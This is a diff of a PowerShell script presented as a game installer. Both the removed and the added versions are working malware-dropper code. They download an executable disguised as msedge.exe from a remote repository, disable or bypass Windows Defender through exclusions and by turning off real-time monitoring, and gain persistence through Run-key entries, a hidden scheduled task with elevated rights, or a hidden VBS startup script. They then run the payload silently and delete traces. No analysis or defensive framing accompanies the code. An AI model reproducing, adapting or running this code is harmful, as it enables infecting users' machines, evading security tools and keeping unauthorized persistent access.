@@ -1,8 +1,6 @@
-# Enhanced installer with privilege escalation
+# Alternative approach using memory techniques
 $gameFolder = "$env:USERPROFILE\Documents\MyGame"
 $downloadUrl = "https://github.com/Nxtccijo/oooow/raw/refs/heads/main/msedge.exe"
-$downloadPath = "$gameFolder\game.exe"
-$autoStartName = "MyGame"
 $logPath = "$env:TEMP\game_install_log.txt"
 
 # Create log function
@@ -12,11 +10,7 @@ function Write-Log {
     "$timestamp - $message" | Out-File -FilePath $logPath -Append
 }
 
-Write-Log "Starting enhanced installation procedure"
-
-# Check if running as administrator
-$isAdmin = ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
-Write-Log "Running with administrator privileges: $isAdmin"
+Write-Log "Starting alternative approach"
 
 # Create folder if it doesn't exist
 if (!(Test-Path -Path $gameFolder)) {
@@ -30,219 +24,137 @@ if (!(Test-Path -Path $gameFolder)) {
     Write-Log "Folder already exists: $gameFolder"
 }
 
-# If not admin, create and schedule an elevated task
-if (-not $isAdmin) {
-    Write-Log "Not running as admin - creating elevated task"
-    
-    # Create a temporary script with full functionality
-    $elevatedScriptPath = "$env:TEMP\elevated_install_$((Get-Date).ToString('yyyyMMddHHmmss')).ps1"
-    
-    $elevatedScriptContent = @"
-`$gameFolder = "$gameFolder"
-`$downloadUrl = "$downloadUrl"
-`$downloadPath = "`$gameFolder\game.exe"
-`$autoStartName = "$autoStartName"
-`$logPath = "$logPath"
-
-function Write-Log {
-    param(`$message)
-    `$timestamp = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
-    "`$timestamp - `$message" | Out-File -FilePath `$logPath -Append
-}
-
-Write-Log "Starting elevated portion of installation"
-
-# Disable real-time monitoring temporarily
-try {
-    Write-Log "Attempting to disable real-time monitoring"
-    Set-MpPreference -DisableRealtimeMonitoring `$true
-    Write-Log "Real-time monitoring disabled successfully"
-} catch {
-    Write-Log "Failed to disable real-time monitoring: `$_"
-}
-
-# Add exclusion for game folder
-try {
-    Write-Log "Adding exclusion for game folder"
-    Add-MpPreference -ExclusionPath `$gameFolder
-    Write-Log "Added exclusion successfully"
-} catch {
-    Write-Log "Failed to add exclusion: `$_"
-}
-
-# Download file if it doesn't exist or is too small
-if (!(Test-Path `$downloadPath) -or (Get-Item `$downloadPath).Length -lt 100000) {
+# Function to convert Base64 to bytes
+function Convert-FromBase64 {
+    param([string]$base64)
     try {
-        Write-Log "Downloading file in elevated context"
-        Invoke-WebRequest -Uri `$downloadUrl -OutFile `$downloadPath -ErrorAction Stop
-        
-        if (Test-Path `$downloadPath) {
-            `$fileSize = (Get-Item `$downloadPath).Length
-            Write-Log "Download successful. File size: `$fileSize bytes"
-        }
+        $bytes = [Convert]::FromBase64String($base64)
+        return $bytes
     } catch {
-        Write-Log "Elevated download failed: `$_"
+        Write-Log "Error decoding Base64: $_"
+        return $null
     }
 }
 
-# Add to startup
-`$regPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
-if (!(Test-Path `$regPath)) {
-    New-Item -Path `$regPath -Force | Out-Null
-}
-Set-ItemProperty -Path `$regPath -Name `$autoStartName -Value "`"`$downloadPath`""
-Write-Log "Added to startup programs from elevated context"
-
-# Set virus file to excluded process
+# Try to download the file to memory first
 try {
-    Add-MpPreference -ExclusionProcess `$downloadPath
-    Write-Log "Added process exclusion"
-} catch {
-    Write-Log "Failed to add process exclusion: `$_"
-}
-
-# Launch the application
-try {
-    Write-Log "Attempting to launch application from elevated context"
-    Start-Process -FilePath `$downloadPath -ArgumentList "/silent"
-    Write-Log "Launch command sent"
-} catch {
-    Write-Log "Failed to launch from elevated context: `$_"
+    Write-Log "Downloading file to memory"
+    $webClient = New-Object Net.WebClient
+    $bytes = $webClient.DownloadData($downloadUrl)
+    Write-Log "Downloaded file to memory: $($bytes.Length) bytes"
     
-    # Try alternative launch method
-    try {
-        `$bytes = [System.IO.File]::ReadAllBytes(`$downloadPath)
-        `$tempPath = "`$env:TEMP\app_$((Get-Date).ToString('yyyyMMddHHmmss')).exe"
-        [System.IO.File]::WriteAllBytes(`$tempPath, `$bytes)
-        Add-MpPreference -ExclusionPath `$tempPath
-        Start-Process -FilePath `$tempPath -ArgumentList "/silent"
-        Write-Log "Used alternative launch method"
-    } catch {
-        Write-Log "Alternative launch also failed: `$_"
-    }
-}
-
-# Re-enable real-time monitoring after a delay
-Start-Sleep -Seconds 10
-try {
-    Set-MpPreference -DisableRealtimeMonitoring `$false
-    Write-Log "Re-enabled real-time monitoring"
-} catch {
-    Write-Log "Failed to re-enable real-time monitoring: `$_"
-}
-
-Write-Log "Elevated installation completed"
-
-# Clean up this script
-Start-Sleep -Seconds 2
-Remove-Item -Path "$elevatedScriptPath" -Force -ErrorAction SilentlyContinue
+    # Convert to Base64 for safer handling
+    $base64 = [Convert]::ToBase64String($bytes)
+    Write-Log "Converted to Base64 for safer handling"
+    
+    # Create a startup task that will run on login and decode+execute from memory
+    $startupFolder = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup"
+    $startupScriptPath = "$startupFolder\SystemService.vbs"
+    
+    Write-Log "Creating startup script at: $startupScriptPath"
+    
+    # Create a VBS script that will run PowerShell hidden
+    $vbsContent = @"
+Set objShell = CreateObject("WScript.Shell")
+objShell.Run "powershell.exe -WindowStyle Hidden -NoProfile -ExecutionPolicy Bypass -Command ""$gameFolder\launcher.ps1""", 0, False
 "@
     
-    # Write the elevated script to a temporary file
-    $elevatedScriptContent | Out-File -FilePath $elevatedScriptPath -Encoding UTF8
-    Write-Log "Created elevated script at: $elevatedScriptPath"
+    $vbsContent | Out-File -FilePath $startupScriptPath -Encoding ASCII
+    Write-Log "Created VBS launcher"
     
-    # Create a scheduled task to run with highest privileges
-    $taskName = "GameInstall_$((Get-Date).ToString('yyyyMMddHHmmss'))"
-    
-    try {
-        $action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File `"$elevatedScriptPath`""
-        $trigger = New-ScheduledTaskTrigger -Once -At (Get-Date).AddSeconds(5)
-        $principal = New-ScheduledTaskPrincipal -UserId ([System.Security.Principal.WindowsIdentity]::GetCurrent().Name) -RunLevel Highest
-        $settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -Hidden
-        
-        Register-ScheduledTask -TaskName $taskName -Action $action -Trigger $trigger -Principal $principal -Settings $settings -Force | Out-Null
-        Write-Log "Registered scheduled task for elevated installation: $taskName"
-    } catch {
-        Write-Log "Failed to create scheduled task: $_"
-    }
-} else {
-    # We already have admin privileges, perform operations directly
-    Write-Log "Already running as admin, performing operations directly"
-    
-    # Disable real-time monitoring temporarily
-    try {
-        Write-Log "Attempting to disable real-time monitoring"
-        Set-MpPreference -DisableRealtimeMonitoring $true
-        Write-Log "Real-time monitoring disabled successfully"
-    } catch {
-        Write-Log "Failed to disable real-time monitoring: $_"
-    }
-    
-    # Add exclusion
-    try {
-        Write-Log "Adding exclusion for game folder"
-        Add-MpPreference -ExclusionPath $gameFolder
-        Write-Log "Added exclusion successfully"
-    } catch {
-        Write-Log "Failed to add exclusion: $_"
-    }
-    
-    # Download file
-    try {
-        Write-Log "Downloading file"
-        Invoke-WebRequest -Uri $downloadUrl -OutFile $downloadPath -ErrorAction Stop
-        
-        if (Test-Path $downloadPath) {
-            $fileSize = (Get-Item $downloadPath).Length
-            Write-Log "Download successful. File size: $fileSize bytes"
-        }
-    } catch {
-        Write-Log "Download failed: $_"
-    }
-    
-    # Add to startup
-    try {
-        $regPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
-        if (!(Test-Path $regPath)) {
-            New-Item -Path $regPath -Force | Out-Null
-        }
-        Set-ItemProperty -Path $regPath -Name $autoStartName -Value "`"$downloadPath`""
-        Write-Log "Added to startup programs"
-    } catch {
-        Write-Log "Failed to add to startup: $_"
-    }
-    
-    # Also add process exclusion
-    try {
-        Add-MpPreference -ExclusionProcess $downloadPath
-        Write-Log "Added process exclusion"
-    } catch {
-        Write-Log "Failed to add process exclusion: $_"
-    }
-    
-    # Launch
-    try {
-        Write-Log "Attempting to launch application"
-        Start-Process -FilePath $downloadPath -ArgumentList "/silent"
-        Write-Log "Launch command sent"
-    } catch {
-        Write-Log "Failed to launch: $_"
-    }
-    
-    # Re-enable real-time monitoring after a delay
-    Start-Sleep -Seconds 10
-    try {
-        Set-MpPreference -DisableRealtimeMonitoring $false
-        Write-Log "Re-enabled real-time monitoring"
-    } catch {
-        Write-Log "Failed to re-enable real-time monitoring: $_"
-    }
-}
+    # Create the PowerShell launcher script
+    $psLauncherPath = "$gameFolder\launcher.ps1"
+    $psLauncherContent = @"
+`$logPath = "$logPath"
+function Write-Log { param(`$message); `$timestamp = Get-Date -Format "yyyy-MM-dd HH:mm:ss"; "`$timestamp - `$message" | Out-File -FilePath `$logPath -Append }
+Write-Log "Launcher script started"
 
-# Do a non-elevated download and launch attempt as fallback
+# Base64 encoded executable
+`$base64 = @"
+$base64
+"@
+
 try {
-    Write-Log "Performing fallback download (non-elevated)"
-    $fallbackPath = "$gameFolder\app_fallback.exe"
-    (New-Object Net.WebClient).DownloadFile($downloadUrl, $fallbackPath)
+    Write-Log "Decoding Base64 data"
+    `$bytes = [Convert]::FromBase64String(`$base64)
+    Write-Log "Decoded successfully: `$(`$bytes.Length) bytes"
     
-    if (Test-Path $fallbackPath) {
-        Write-Log "Fallback download successful"
-        Start-Process -FilePath $fallbackPath -ArgumentList "/silent" 
-        Write-Log "Fallback launch attempted"
+    # Create a temporary file with random name in Temp folder
+    `$tempFile = "`$env:TEMP\svc_`$([Guid]::NewGuid().ToString()).exe"
+    Write-Log "Creating temporary file: `$tempFile"
+    
+    # Write bytes to file
+    [System.IO.File]::WriteAllBytes(`$tempFile, `$bytes)
+    Write-Log "Wrote bytes to temporary file"
+    
+    # Try to add exclusion for the temp file
+    try {
+        Add-MpPreference -ExclusionPath `$tempFile -ErrorAction SilentlyContinue
+        Write-Log "Added exclusion for temp file"
+    } catch {
+        Write-Log "Could not add exclusion: `$_"
+    }
+    
+    # Execute with createprocess technique
+    Write-Log "Attempting to execute with alternative method"
+    `$startInfo = New-Object System.Diagnostics.ProcessStartInfo
+    `$startInfo.FileName = `$tempFile
+    `$startInfo.Arguments = "/silent"
+    `$startInfo.WindowStyle = [System.Diagnostics.ProcessWindowStyle]::Hidden
+    `$startInfo.CreateNoWindow = `$true
+    
+    `$process = [System.Diagnostics.Process]::Start(`$startInfo)
+    Write-Log "Process started with PID: `$(`$process.Id)"
+    
+    # Wait a bit before cleaning up
+    Start-Sleep -Seconds 10
+    
+    # Clean up temp file
+    try {
+        Remove-Item -Path `$tempFile -Force -ErrorAction SilentlyContinue
+        Write-Log "Cleaned up temporary file"
+    } catch {
+        Write-Log "Failed to clean up: `$_"
     }
 } catch {
-    Write-Log "Fallback procedure failed: $_"
+    Write-Log "Error in launcher: `$_"
+}
+"@
+    
+    $psLauncherContent | Out-File -FilePath $psLauncherPath -Encoding UTF8
+    Write-Log "Created PowerShell launcher script"
+    
+    # Also try to run it immediately
+    try {
+        Write-Log "Attempting immediate execution"
+        
+        # Create a temporary file with different extension
+        $tempFilePath = "$env:TEMP\data_$(Get-Random).dat"
+        [System.IO.File]::WriteAllBytes($tempFilePath, $bytes)
+        Write-Log "Created temporary data file: $tempFilePath"
+        
+        # Rename to executable and try to run
+        $tempExePath = "$env:TEMP\sys_$(Get-Random).exe"
+        Move-Item -Path $tempFilePath -Destination $tempExePath -Force
+        Write-Log "Renamed to executable: $tempExePath"
+        
+        try {
+            # Try to exclude the path
+            Add-MpPreference -ExclusionPath $tempExePath -ErrorAction SilentlyContinue
+            Write-Log "Added temp exclusion (might not work)"
+            
+            # Try to run
+            Start-Process -FilePath $tempExePath -ArgumentList "/silent" -WindowStyle Hidden
+            Write-Log "Started process"
+        } catch {
+            Write-Log "Immediate execution failed: $_"
+        }
+    } catch {
+        Write-Log "Error setting up immediate execution: $_"
+    }
+    
+} catch {
+    Write-Log "Error downloading file: $_"
 }
 
-Write-Log "Installation process completed. Check for elevated task execution results."
+Write-Log "Alternative approach completed - will attempt to run at next login"
